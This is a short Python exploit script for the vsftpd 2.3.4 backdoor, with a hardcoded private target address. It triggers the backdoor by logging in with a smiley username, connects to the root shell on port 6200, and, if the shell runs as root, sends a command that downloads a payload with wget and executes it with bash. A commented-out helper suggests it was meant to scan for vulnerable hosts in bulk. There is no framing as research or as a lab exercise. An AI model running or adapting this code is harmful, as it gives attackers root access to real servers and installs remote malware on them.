#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2019-04-03 23:49:05
# @Author  : owefsad (1528360120@qq.com)
# @Link    : http://blog.51cto.com/executer
# @Version : $Id$

#from spider import get_sd
from time import sleep
import threading, socket
import fire

backdoor_exp="wget <backdoor> -O /opt/load_movie.sh;/usr/bin/bash /opt/load_movie.sh\n"


def handle_backdoor(nsock):
	try:
		nsock.send("id\n".encode("utf-8"))
		ans=nsock.recv(1024).strip().decode("utf-8")
		if "uid=" not in ans:
			print("The service on port 6200 dose not appear to a shell")
		elif "uid=0" in ans:
			nsock.send(backdoor_exp.encode("utf-8"))
		else:
			print(ans)
		#s.put("nohup "+payload.encode("utf-8")+" >/dev/null 2>&1")
		return
	except Exception as e:
		raise
	finally:
		nsock.close()

def open_backdoor(ip, port):
	try:
		from ftplib import FTP
		ftp = FTP(ip)
		ftp.port = port
		ftp.login(user="ftp:)", passwd="pass")
		ftp.getresp()
	except Exception as e:
		if "500 OOPS" in str(e):
			pass
		else:
			print(e)
	else:
		pass
	finally:
		pass
def conn_backdoor(ip):
	try:
		nsock=socket.socket()
		nsock.connect((ip, 6200))
		return nsock
	except Exception as e:
		nsock.close()
		raise e


def exploit(ip, port):
	try:
		nsock=conn_backdoor(ip)
		handle_backdoor(nsock)
	except ConnectionRefusedError as e:
		t=threading.Thread(target=open_backdoor, args=(ip, port))
		t.start()
		sleep(1)
		nsock=conn_backdoor(ip)
		handle_backdoor(nsock)
	else:
		pass
	finally:
		pass




def main():
	theck_ts = []
	#ress=get_sd("vsftpd 2.3.4")
	ress=[("172.16.88.170", 21)]
	for res in ress:
		exploit(ip=res[0], port=res[1])


if __name__ == '__main__':
	fire.Fire()
